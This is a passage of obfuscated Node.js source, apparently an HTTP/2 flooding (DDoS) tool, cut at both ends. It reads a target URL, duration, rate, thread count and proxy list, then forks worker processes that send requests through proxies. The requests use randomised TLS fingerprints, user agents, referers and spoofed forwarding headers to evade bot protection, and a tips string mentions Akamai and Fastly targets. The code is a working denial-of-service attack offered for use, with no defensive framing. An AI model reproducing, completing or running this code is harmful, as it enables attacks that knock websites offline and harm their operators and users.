              ? (_0x118367 += String.fromCharCode(
                  255 & (_0x2644f1 >> ((-2 * _0x4b9695) & 6))
                ))
              : 0
          ) {
            _0xce42ee = _0x32c1f8.indexOf(_0xce42ee)
          }
          return _0x118367
        })
    })(),
    (_0x475f.ObUzsD = function (_0x4007fe) {
      var _0x3ea09b = atob(_0x4007fe),
        _0x311a7f = []
      for (
        var _0x40f954 = 0, _0x474ac0 = _0x3ea09b.length;
        _0x40f954 < _0x474ac0;
        _0x40f954++
      ) {
        _0x311a7f +=
          '%' + ('00' + _0x3ea09b.charCodeAt(_0x40f954).toString(16)).slice(-2)
      }
      return decodeURIComponent(_0x311a7f)
    }),
    (_0x475f.yeGTxB = {}),
    (_0x475f.SytPOC = true))
  var _0x3baf23 = _0x475f.yeGTxB[_0x2138cc]
  return (
    _0x3baf23 === undefined
      ? ((_0x11d14d = _0x475f.ObUzsD(_0x11d14d)),
        (_0x475f.yeGTxB[_0x2138cc] = _0x11d14d))
      : (_0x11d14d = _0x3baf23),
    _0x11d14d
  )
}
const net = require(_0x475f('\u202E0')),
  http2 = require(_0x475f('\u202B1')),
  tls = require(_0x475f('\u202E2')),
  cluster = require(_0x475f('\u202E3')),
  url = require(_0x475f('\u202E4')),
  crypto = require('crypto'),
  fs = require('fs'),
  errorHandler = (_0x578f7d) => {}
process.on(_0x475f('\u202E5'), errorHandler)
process.on(_0x475f('\u202E6'), errorHandler)
process.setMaxListeners(0)
require(_0x475f('\u202E7')).EventEmitter[_0x475f('\u202B8')] = 0
process.on('uncaughtException', function (_0x369f12) {})
process.argv[_0x475f('\u202B9')] < 7 &&
  (console.log(_0x475f('\u202Ea')), process[_0x475f('\u202Bb')]())
const headers = {}
function readLines(_0x36af82) {
  return fs
    .readFileSync(_0x36af82, 'utf-8')
    .toString()
    [_0x475f('\u202Ec')](/\r?\n/)
}
function randomIntn(_0x3d5f84, _0x1aadb7) {
  return Math[_0x475f('\u202Bd')](
    _0x2ce2e9[_0x475f('\u202Ee')](
      Math.random() * (_0x1aadb7 - _0x3d5f84),
      _0x3d5f84
    )
  )
}
function randomElement(_0x2bf2d1) {
  return _0x2bf2d1[
    _0x35a5f0[_0x475f('\u202Bf')](randomIntn, 0, _0x2bf2d1[_0x475f('\u202B9')])
  ]
}
function randstr(_0x55c367) {
  var _0x474f3c = {
    ueucX: function (_0x4503ac, _0x49fded) {
      return _0x4503ac < _0x49fded
    },
    zlxCJ: function (_0x46ba2d, _0x5a0a39) {
      return _0x46ba2d === _0x5a0a39
    },
    cEjRL: _0x475f('\u202B10'),
    UdoZW: _0x475f('\u202B11'),
    fRxyc: function (_0x326cc5, _0x1d4f1d) {
      return _0x326cc5 * _0x1d4f1d
    },
  }
  const _0x2972a3 = _0x475f('\u202E12')
  let _0x3ec525 = ''
  const _0xfbacc = _0x2972a3[_0x475f('\u202B9')]
  for (
    let _0x1b77c2 = 0;
    _0x474f3c[_0x475f('\u202B13')](_0x1b77c2, _0x55c367);
    _0x1b77c2++
  ) {
    if (
      _0x474f3c.zlxCJ(
        _0x474f3c[_0x475f('\u202E14')],
        _0x474f3c[_0x475f('\u202E15')]
      )
    ) {
      request[_0x475f('\u202B16')]()
      request.destroy()
      return
    } else {
      _0x3ec525 += _0x2972a3[_0x475f('\u202E17')](
        Math.floor(
          _0x474f3c[_0x475f('\u202E18')](Math[_0x475f('\u202B19')](), _0xfbacc)
        )
      )
    }
  }
  return _0x3ec525
}
const ip_spoof = () => {
    const _0xc9ed9e = () => {
      return Math.floor(Math.random() * 255)
    }
    return (
      _0xc9ed9e() +
      '.' +
      _0x24c9af[_0x475f('\u202E1a')](_0xc9ed9e) +
      '.' +
      _0xc9ed9e() +
      '.' +
      _0x24c9af[_0x475f('\u202B1b')](_0xc9ed9e)
    )
  },
  spoofed = ip_spoof(),
  ip_spoof2 = () => {
    const _0x267ee8 = () => {
      return Math[_0x475f('\u202Bd')](Math[_0x475f('\u202B19')]() * 9999)
    }
    return '' + _0x358256[_0x475f('\u202B1c')](_0x267ee8)
  },
  spoofed2 = ip_spoof2(),
  args = {
    target: process[_0x475f('\u202E1d')][2],
    time: parseInt(process[_0x475f('\u202E1d')][3]),
    Rate: parseInt(process[_0x475f('\u202E1d')][4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process[_0x475f('\u202E1d')][6],
  },
  sig = [
    _0x475f('\u202B1e'),
    _0x475f('\u202E1f'),
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    _0x475f('\u202E20'),
    'rsa_pkcs1_sha512',
  ],
  sigalgs1 = sig[_0x475f('\u202E21')](':'),
  cplist = [
    _0x475f('\u202B22'),
    _0x475f('\u202E23'),
    _0x475f('\u202E24'),
    _0x475f('\u202E25'),
  ],
  accept_header = [
    _0x475f('\u202E26'),
    _0x475f('\u202B27'),
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    _0x475f('\u202E26'),
    _0x475f('\u202B28'),
    _0x475f('\u202B29'),
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    _0x475f('\u202B28'),
    _0x475f('\u202B29'),
    _0x475f('\u202B2a'),
    _0x475f('\u202E2b'),
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    _0x475f('\u202B2c'),
    _0x475f('\u202B2d'),
    _0x475f('\u202E2e'),
    _0x475f('\u202E2f'),
    _0x475f('\u202E30'),
    _0x475f('\u202B31'),
    'text/html; charset=utf-8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    _0x475f('\u202B32'),
    _0x475f('\u202B33'),
  ]
lang_header = [
  'ko-KR',
  'en-US',
  _0x475f('\u202B34'),
  _0x475f('\u202E35'),
  _0x475f('\u202B36'),
  'en-GB',
  _0x475f('\u202B37'),
  _0x475f('\u202B38'),
  _0x475f('\u202B39'),
  _0x475f('\u202E3a'),
  _0x475f('\u202E3b'),
  _0x475f('\u202B3c'),
  _0x475f('\u202E3d'),
  'en-ZA',
  'en-IN',
  _0x475f('\u202B3e'),
  _0x475f('\u202E3f'),
  _0x475f('\u202B40'),
  _0x475f('\u202E41'),
  _0x475f('\u202E42'),
  _0x475f('\u202E43'),
  '*',
  _0x475f('\u202B44'),
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  _0x475f('\u202B45'),
  _0x475f('\u202E46'),
  _0x475f('\u202B47'),
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  _0x475f('\u202E48'),
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  _0x475f('\u202E49'),
  _0x475f('\u202B4a'),
  'tr',
  _0x475f('\u202B4b'),
]
const encoding_header = [
    '*',
    _0x475f('\u202E4c'),
    _0x475f('\u202E4d'),
    _0x475f('\u202E4e'),
    'compress, gzip',
    'deflate, gzip',
    _0x475f('\u202B4f'),
    'gzip, deflate',
    'br',
    _0x475f('\u202B50'),
    _0x475f('\u202E51'),
    'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
    _0x475f('\u202E52'),
    _0x475f('\u202E53'),
    _0x475f('\u202B54'),
    _0x475f('\u202B55'),
    _0x475f('\u202E56'),
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    _0x475f('\u202E57'),
  ],
  control_header = [
    _0x475f('\u202B58'),
    _0x475f('\u202E59'),
    _0x475f('\u202E5a'),
    _0x475f('\u202E5b'),
    'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
    _0x475f('\u202B5c'),
    _0x475f('\u202B5d'),
    _0x475f('\u202E5e'),
    _0x475f('\u202E5f'),
    _0x475f('\u202E60'),
    _0x475f('\u202B61'),
    _0x475f('\u202E62'),
    _0x475f('\u202B63'),
    'private',
    _0x475f('\u202E64'),
    _0x475f('\u202E65'),
    _0x475f('\u202B66'),
    'no-cache, no-transform',
    _0x475f('\u202E67'),
    _0x475f('\u202E68'),
    _0x475f('\u202B69'),
    _0x475f('\u202E6a'),
    _0x475f('\u202B6b'),
    'only-if-cached',
    _0x475f('\u202E6c'),
  ],
  refers = [
    _0x475f('\u202B6d'),
    'https://check-host.net/',
    _0x475f('\u202B6e'),
    _0x475f('\u202B6f'),
    _0x475f('\u202E70'),
    _0x475f('\u202B71'),
    _0x475f('\u202E72'),
    _0x475f('\u202E73'),
    _0x475f('\u202B74'),
    _0x475f('\u202B75'),
    'https://help.baidu.com/searchResult?keywords=',
    'https://steamcommunity.com/market/search?q=',
    _0x475f('\u202E76'),
    _0x475f('\u202B77'),
    'https://www.qwant.com/search?q=',
    _0x475f('\u202E78'),
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    _0x475f('\u202B79'),
    _0x475f('\u202E7a'),
    _0x475f('\u202E7b'),
    _0x475f('\u202E7c'),
    _0x475f('\u202B7d'),
    _0x475f('\u202B7e'),
    _0x475f('\u202E7f'),
    _0x475f('\u202B80'),
    _0x475f('\u202B81'),
    _0x475f('\u202B82'),
    _0x475f('\u202E83'),
    _0x475f('\u202E84'),
    _0x475f('\u202B85'),
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    _0x475f('\u202B86'),
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    _0x475f('\u202E87'),
    _0x475f('\u202E88'),
    _0x475f('\u202B89'),
    _0x475f('\u202B8a'),
    'http://jobs.leidos.com/search?q=',
    _0x475f('\u202E8b'),
    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
    _0x475f('\u202E8c'),
    _0x475f('\u202B8d'),
    _0x475f('\u202E8e'),
    _0x475f('\u202E8f'),
    _0x475f('\u202E90'),
    _0x475f('\u202E91'),
    _0x475f('\u202E92'),
    _0x475f('\u202E93'),
    _0x475f('\u202B94'),
    'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/',
    _0x475f('\u202B95'),
  ],
  defaultCiphers = crypto[_0x475f('\u202E96')].defaultCoreCipherList.split(':'),
  ciphers1 =
    _0x475f('\u202B97') +
    [
      defaultCiphers[2],
      defaultCiphers[1],
      defaultCiphers[0],
      ...defaultCiphers[_0x475f('\u202B98')](3),
    ].join(':'),
  uap = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    _0x475f('\u202E99'),
    _0x475f('\u202E9a'),
    _0x475f('\u202B9b'),
    _0x475f('\u202B9c'),
    _0x475f('\u202E9d'),
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    _0x475f('\u202E9e'),
    _0x475f('\u202B9f'),
    _0x475f('\u202Ea0'),
    _0x475f('\u202Ea1'),
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    _0x475f('\u202Ba2'),
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    _0x475f('\u202Ea3'),
    _0x475f('\u202Ea4'),
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0',
    _0x475f('\u202Ea5'),
    _0x475f('\u202Ba6'),
    _0x475f('\u202Ea7'),
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    _0x475f('\u202Ea8'),
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    _0x475f('\u202Ea9'),
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    _0x475f('\u202Baa'),
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    _0x475f('\u202Eab'),
    _0x475f('\u202Bac'),
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0',
  ]
platform = [_0x475f('\u202Ead'), _0x475f('\u202Eae'), _0x475f('\u202Eaf')]
methods = [_0x475f('\u202Bb0'), _0x475f('\u202Bb1')]
version = [
  _0x475f('\u202Bb2'),
  '"Chromium";v="115", "Not)A;Brand";v="8", "Google Chrome";v="115"',
  _0x475f('\u202Eb3'),
  _0x475f('\u202Eb4'),
  _0x475f('\u202Bb5'),
  '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
  _0x475f('\u202Bb6'),
  '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"',
  '"Chromium";v="113", "Not)A;Brand";v="24", "Google Chrome";v="113"',
  _0x475f('\u202Bb7'),
  _0x475f('\u202Bb8'),
  _0x475f('\u202Eb9'),
  '"Chromium";v="114", "Not)A;Brand";v="99", "Google Chrome";v="114"',
  '"Chromium";v="113", "Not)A;Brand";v="99", "Google Chrome";v="113"',
  '"Chromium";v="112", "Not)A;Brand";v="99", "Google Chrome";v="112"',
]
const a6 = [
    _0x475f('\u202Eba'),
    _0x475f('\u202Ebb'),
    _0x475f('\u202Bbc'),
    '"Chromium";v="113.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="113.0.0.0"',
    _0x475f('\u202Ebd'),
    _0x475f('\u202Bbe'),
    _0x475f('\u202Ebf'),
    _0x475f('\u202Ec0'),
    '"Chromium";v="113.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="113.0.0.0"',
    _0x475f('\u202Ec1'),
    _0x475f('\u202Bc2'),
    '"Chromium";v="115.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="115.0.0.0"',
    '"Chromium";v="114.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="114.0.0.0"',
    _0x475f('\u202Bc3'),
    _0x475f('\u202Ec4'),
  ],
  jalist = [
    _0x475f('\u202Bc5'),
    _0x475f('\u202Ec6'),
    _0x475f('\u202Ec7'),
    _0x475f('\u202Bc8'),
    _0x475f('\u202Ec9'),
    _0x475f('\u202Bca'),
    _0x475f('\u202Bcb'),
    _0x475f('\u202Bcc'),
    _0x475f('\u202Bcd'),
    'da949afd9bd6df820730f8f171584a71',
    _0x475f('\u202Ece'),
    _0x475f('\u202Bcf'),
    _0x475f('\u202Ed0'),
    '0b6592fd91d4843c823b75e49b43838d',
    _0x475f('\u202Ed1'),
    _0x475f('\u202Bd2'),
    _0x475f('\u202Bd3'),
    'a88f1426c4603f2a8cd8bb41e875cb75',
    _0x475f('\u202Bd4'),
    'bfcc1a3891601edb4f137ab7ab25b840',
    'ce694315cbb81ce95e6ae4ae8cbafde6',
    _0x475f('\u202Bd5'),
  ],
  tips1 = [
    _0x475f('\u202Ed6'),
    _0x475f('\u202Bd7'),
    'recommended big proxyfile if target is akamai/fastly',
    _0x475f('\u202Ed8'),
    'My channel: https://t.me/SaturnSpark',
  ]
site = [_0x475f('\u202Bd9'), 'same-origin', _0x475f('\u202Eda'), 'none']
mode = ['cors', 'navigate', 'no-cors', _0x475f('\u202Bdb')]
dest = [
  _0x475f('\u202Bdc'),
  _0x475f('\u202Edd'),
  'embed',
  _0x475f('\u202Ede'),
  _0x475f('\u202Edf'),
]
var cipper =
    cplist[
      Math[_0x475f('\u202Bd')](
        Math.floor(Math[_0x475f('\u202B19')]() * cplist[_0x475f('\u202B9')])
      )
    ],
  jar =
    jalist[
      Math[_0x475f('\u202Bd')](
        Math.floor(Math.random() * jalist[_0x475f('\u202B9')])
      )
    ],
  siga =
    sig[
      Math[_0x475f('\u202Bd')](
        Math[_0x475f('\u202Bd')](Math[_0x475f('\u202B19')]() * sig.length)
      )
    ],
  tipsz =
    tips1[
      Math.floor(
        Math[_0x475f('\u202Bd')](
          Math[_0x475f('\u202B19')]() * tips1[_0x475f('\u202B9')]
        )
      )
    ],
  a =
    a6[
      Math[_0x475f('\u202Bd')](
        Math[_0x475f('\u202Bd')](Math[_0x475f('\u202B19')]() * a6.length)
      )
    ],
  methodd =
    methods[
      Math.floor(
        Math.floor(Math[_0x475f('\u202B19')]() * methods[_0x475f('\u202B9')])
      )
    ],
  site1 =
    site[
      Math[_0x475f('\u202Bd')](
        Math[_0x475f('\u202Bd')](
          Math[_0x475f('\u202B19')]() * site[_0x475f('\u202B9')]
        )
      )
    ],
  mode1 =
    mode[
      Math[_0x475f('\u202Bd')](
        Math[_0x475f('\u202Bd')](
          Math[_0x475f('\u202B19')]() * mode[_0x475f('\u202B9')]
        )
      )
    ],
  dest1 =
    dest[
      Math[_0x475f('\u202Bd')](
        Math[_0x475f('\u202Bd')](Math[_0x475f('\u202B19')]() * dest.length)
      )
    ],
  ver =
    version[
      Math[_0x475f('\u202Bd')](
        Math[_0x475f('\u202Bd')](Math.random() * version[_0x475f('\u202B9')])
      )
    ],
  platforms =
    platform[
      Math[_0x475f('\u202Bd')](
        Math[_0x475f('\u202Bd')](
          Math[_0x475f('\u202B19')]() * platform[_0x475f('\u202B9')]
        )
      )
    ],
  uap1 = uap[Math.floor(Math.floor(Math[_0x475f('\u202B19')]() * uap.length))],
  Ref =
    refers[
      Math.floor(
        Math[_0x475f('\u202Bd')](Math[_0x475f('\u202B19')]() * refers.length)
      )
    ],
  accept =
    accept_header[
      Math[_0x475f('\u202Bd')](
        Math.floor(Math.random() * accept_header[_0x475f('\u202B9')])
      )
    ],
  lang =
    lang_header[
      Math[_0x475f('\u202Bd')](
        Math[_0x475f('\u202Bd')](
          Math[_0x475f('\u202B19')]() * lang_header[_0x475f('\u202B9')]
        )
      )
    ],
  encoding =
    encoding_header[
      Math[_0x475f('\u202Bd')](
        Math[_0x475f('\u202Bd')](
          Math[_0x475f('\u202B19')]() * encoding_header[_0x475f('\u202B9')]
        )
      )
    ],
  control =
    control_header[
      Math.floor(
        Math[_0x475f('\u202Bd')](
          Math[_0x475f('\u202B19')]() * control_header[_0x475f('\u202B9')]
        )
      )
    ],
  proxies = readLines(args[_0x475f('\u202Be0')])
const parsedTarget = url.parse(args[_0x475f('\u202Be1')]),
  rateHeaders = [
    { 'A-IM': _0x475f('\u202Ee2') },
    { accept: accept },
    { 'accept-charset': accept },
    { 'accept-datetime': accept },
    { 'accept-encoding': encoding },
    { 'accept-language': lang },
    { 'upgrade-insecure-requests': '1' },
    { 'Access-Control-Request-Method': _0x475f('\u202Bb0') },
    { 'Cache-Control': _0x475f('\u202B66') },
    { 'Content-Encoding': _0x475f('\u202E4d') },
    { 'content-type': _0x475f('\u202Ee3') },
    { cookie: randstr(15) },
    { Expect: _0x475f('\u202Be4') },
    { Forwarded: 'for=192.168.0.1;proto=http;by=' + spoofed },
    { From: 'user@gmail.com' },
    { 'Max-Forwards': '10' },
    { origin: _0x475f('\u202Be5') + parsedTarget[_0x475f('\u202Be6')] },
    { pragma: 'no-cache' },
    { referer: 'https://' + parsedTarget.host + '/' },
  ],
  rateHeaders2 = [
    { Via: _0x475f('\u202Ee7') + parsedTarget.host },
    { 'X-Requested-With': 'XMLHttpRequest' },
    { 'X-Forwarded-For': spoofed },
    { 'X-Vercel-Cache': randstr(15) },
    {
      'Alt-Svc': _0x475f('\u202Be8') + parsedTarget.host + _0x475f('\u202Be9'),
    },
    { TK: '?' },
    { 'X-Frame-Options': _0x475f('\u202Bea') },
    { 'X-ASP-NET': randstr(25) },
    { Refresh: '5' },
    { 'X-Content-duration': spoofed },
    {
      'service-worker-navigation-preload':
        Math[_0x475f('\u202B19')]() < 0.5
          ? _0x475f('\u202Eeb')
          : _0x475f('\u202Eec'),
    },
  ]
if (cluster[_0x475f('\u202Eed')]) {
  for (let counter = 1; counter <= args[_0x475f('\u202Bee')]; counter++) {
    cluster[_0x475f('\u202Eef')]()
  }
} else {
  setInterval(runFlooder)
}
class NetSocket {
  constructor() {}
  [_0x475f('\u202Ef0')](_0xf064a6, _0x1b6afe) {
    var _0x27ce2b = {
      jMWnb: 'utf-8',
      VoRCT: _0x475f('\u202Ef1'),
      MQNUN: function (_0x591148, _0x228d5e) {
        return _0x591148 === _0x228d5e
      },
      jYOjn: 'OSxiQ',
      fJbDg: function (_0x1cb70a, _0x3ccb0d, _0x5ec336) {
        return _0x1cb70a(_0x3ccb0d, _0x5ec336)
      },
      pPFmN: _0x475f('\u202Bf2'),
      nKVzP: _0x475f('\u202Ef3'),
      ykxhf: 'WoUhs',
      vIjCk: _0x475f('\u202Ef4'),
      CAKkb: function (_0x38b861, _0x11b726, _0x20df04) {
        return _0x38b861(_0x11b726, _0x20df04)
      },
      xLFUy: function (_0x3ae27b, _0x3663df) {
        return _0x3ae27b !== _0x3663df
      },
      EvwCz: 'hjDTu',
      QlqIU: function (_0x5eb16b, _0x3b0079) {
        return _0x5eb16b + _0x3b0079
      },
      YNDOJ: function (_0x3bf61a, _0x462cd1) {
        return _0x3bf61a + _0x462cd1
      },
      UUOPK: function (_0x521e4a, _0x59e88d) {
        return _0x521e4a + _0x59e88d
      },
      ZFjAz: _0x475f('\u202Bf5'),
      IVOKl: _0x475f('\u202Bf6'),
      fFlgt: _0x475f('\u202Ef7'),
      kJXWn: _0x475f('\u202Ef8'),
      RDqkQ: _0x475f('\u202Ef9'),
      ZqgnM: _0x475f('\u202Efa'),
    }
    const _0x450215 = _0xf064a6[_0x475f('\u202Efb')][_0x475f('\u202Ec')](':'),
      _0x1037a7 = _0x450215[0],
      _0x19201e = _0x27ce2b[_0x475f('\u202Bfc')](
        _0x27ce2b[_0x475f('\u202Bfc')](
          _0x27ce2b.UUOPK(
            _0x27ce2b[_0x475f('\u202Bfd')] + _0xf064a6[_0x475f('\u202Efb')],
            _0x27ce2b.IVOKl
          ),
          _0xf064a6.address
        ),
        _0x475f('\u202Bfe')
      ),
      _0x5be138 = new Buffer[_0x475f('\u202Eff')](_0x19201e),
      _0x43b1f0 = net[_0x475f('\u202Ef7')]({
        host: _0xf064a6[_0x475f('\u202Be6')],
        port: _0xf064a6[_0x475f('\u202B100')],
      })
    _0x43b1f0[_0x475f('\u202B101')](_0xf064a6[_0x475f('\u202Ef9')] * 600000)
    _0x43b1f0[_0x475f('\u202E102')](true, 100000)
    _0x43b1f0.on(_0x27ce2b[_0x475f('\u202E103')], () => {
      _0x43b1f0[_0x475f('\u202B104')](_0x5be138)
    })
    _0x43b1f0.on(_0x27ce2b.kJXWn, (_0x150136) => {
      const _0x1dd486 = _0x150136.toString(_0x27ce2b[_0x475f('\u202B105')]),
        _0x54ddad = _0x1dd486[_0x475f('\u202B106')](_0x27ce2b.VoRCT)
      if (_0x27ce2b[_0x475f('\u202B107')](_0x54ddad, false)) {
        if (
          _0x27ce2b[_0x475f('\u202B108')] !== _0x27ce2b[_0x475f('\u202B108')]
        ) {
          cluster[_0x475f('\u202Eef')]()
        } else {
          return (
            _0x43b1f0[_0x475f('\u202B109')](),
            _0x27ce2b.fJbDg(_0x1b6afe, undefined, _0x27ce2b.pPFmN)
          )
        }
      }
      return _0x27ce2b.fJbDg(_0x1b6afe, _0x43b1f0, undefined)
    })
    _0x43b1f0.on(_0x27ce2b[_0x475f('\u202E10a')], () => {
      if (_0x27ce2b[_0x475f('\u202E10b')] === _0x27ce2b[_0x475f('\u202E10c')]) {
        for (
          let _0x25ff16 = 1;
          _0x5a7631[_0x475f('\u202B10d')](_0x25ff16, args[_0x475f('\u202Bee')]);
          _0x25ff16++
        ) {
          cluster.fork()
        }
      } else {
        return (
          _0x43b1f0[_0x475f('\u202B109')](),
          _0x27ce2b[_0x475f('\u202E10e')](
            _0x1b6afe,
            undefined,
            _0x27ce2b[_0x475f('\u202E10f')]
          )
        )
      }
    })
    _0x43b1f0.on(_0x27ce2b.ZqgnM, (_0x232900) => {
      return _0x27ce2b[_0x475f('\u202E110')](
        _0x27ce2b.EvwCz,
        _0x475f('\u202B111')
      )
        ? elements[_0x27ce2b.CAKkb(randomIntn, 0, elements[_0x475f('\u202B9')])]
        : (_0x43b1f0[_0x475f('\u202B109')](),
          _0x1b6afe(
            undefined,
            _0x27ce2b[_0x475f('\u202B112')](_0x475f('\u202B113'), _0x232900)
          ))
    })
  }
}
var hd = {}
const Socker = new NetSocket()
headers[_0x475f('\u202B114')] = _0x475f('\u202Bb0')
headers[_0x475f('\u202E115')] = parsedTarget[_0x475f('\u202Be6')]
headers[_0x475f('\u202E116')] = _0x475f('\u202B117')
headers[_0x475f('\u202E118')] =
  parsedTarget.path + '?' + randstr(6) + '=' + randstr(15)
headers[':scheme'] = _0x475f('\u202B117')
function runFlooder() {
  var _0x29e754 = {
    uSWnT: function (_0x247c8f, _0x52c8c9) {
      return _0x247c8f * _0x52c8c9
    },
    qmgSy: function (_0x22e545, _0x555b83) {
      return _0x22e545 < _0x555b83
    },
    uWrWg: _0x475f('\u202B119'),
    FRKkb: _0x475f('\u202E11a'),
    Jckrs: _0x475f('\u202B11b'),
    ztvYH: 'https:',
    IPHrw: _0x475f('\u202Ef7'),
    hEsvc: _0x475f('\u202B16'),
    ETMdb: function (_0x13daad, _0x4dfbc7) {
      return _0x13daad(_0x4dfbc7)
    },
    XOsPU: function (_0x3be641, _0x38e2f8) {
      return _0x3be641 + _0x38e2f8
    },
    BtmOt: ':443',
  }
  const _0x42d45a = _0x29e754[_0x475f('\u202E11c')](randomElement, proxies),
    _0x422bb0 = _0x42d45a[_0x475f('\u202Ec')](':'),
    _0xc9279f = {
      host: _0x422bb0[0],
      port: ~~_0x422bb0[1],
      address: _0x29e754[_0x475f('\u202E11d')](
        parsedTarget.host,
        _0x29e754[_0x475f('\u202E11e')]
      ),
      timeout: 100,
    }
  Socker[_0x475f('\u202Ef0')](_0xc9279f, (_0x2f67ec, _0x143fdc) => {
    var _0x252871 = {
      bGXma: function (_0x28b24e, _0xe0aa95) {
        return _0x28b24e(_0xe0aa95)
      },
      MSeWD: function (_0x49413e, _0x149163) {
        return _0x29e754[_0x475f('\u202E11f')](_0x49413e, _0x149163)
      },
      FWQrj: function (_0x27a65c, _0x88e2d) {
        return _0x29e754.qmgSy(_0x27a65c, _0x88e2d)
      },
      ZQSvr: function (_0x269be8, _0x39209b) {
        return _0x269be8 !== _0x39209b
      },
      AimJn: _0x29e754[_0x475f('\u202E120')],
      HTFrb: _0x475f('\u202B121'),
      BLCcR: function (_0x195bc7, _0x5d597d, _0x25ebd8) {
        return _0x195bc7(_0x5d597d, _0x25ebd8)
      },
    }
    if (_0x143fdc) {
      return
    }
    _0x2f67ec[_0x475f('\u202E102')](true, 600000)
    const _0x57379d = {
        host: parsedTarget.host,
        secure: true,
        ALPNProtocols: ['h2'],
        sigals: siga,
        socket: _0x2f67ec,
        ecdhCurve: _0x29e754[_0x475f('\u202B122')],
        ciphers: cipper,
        ja3: jar,
        host: parsedTarget.host,
        rejectUnauthorized: false,
        servername: parsedTarget[_0x475f('\u202Be6')],
        secureProtocol: _0x29e754[_0x475f('\u202B123')],
      },
      _0x289455 = tls.connect(443, parsedTarget.host, _0x57379d)
    _0x289455[_0x475f('\u202E102')](true, 60000)
    const _0x3cd2ce = http2[_0x475f('\u202Ef7')](
      parsedTarget[_0x475f('\u202B124')],
      {
        protocol: _0x29e754[_0x475f('\u202B125')],
        settings: {
          headerTableSize: 65536,
          maxConcurrentStreams: 2000,
          initialWindowSize: 6291456,
          maxHeaderListSize: 65536,
          enablePush: false,
        },
        maxSessionMemory: 3333,
        maxDeflateDynamicTableSize: 4294967295,
        createConnection: () => _0x289455,
        socket: _0x2f67ec,
      }
    )
    _0x3cd2ce[_0x475f('\u202E126')]({
      headerTableSize: 65536,
      maxConcurrentStreams: 2000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 65536,
      enablePush: false,
    })
    _0x3cd2ce.on(_0x29e754[_0x475f('\u202E127')], () => {
      const _0xf26c1c = _0x252871.BLCcR(
        setInterval,
        () => {
          const _0x145f3b = {
            ...headers,
            'user-agent': uap1 + _0x252871.bGXma(randstr, 12),
            ...rateHeaders[
              Math[_0x475f('\u202Bd')](
                Math[_0x475f('\u202B19')]() * rateHeaders[_0x475f('\u202B9')]
              )
            ],
            ...rateHeaders2[
              Math[_0x475f('\u202Bd')](
                _0x252871.MSeWD(
                  Math[_0x475f('\u202B19')](),
                  rateHeaders2.length
                )
              )
            ],
          }
          for (
            let _0x77a182 = 0;
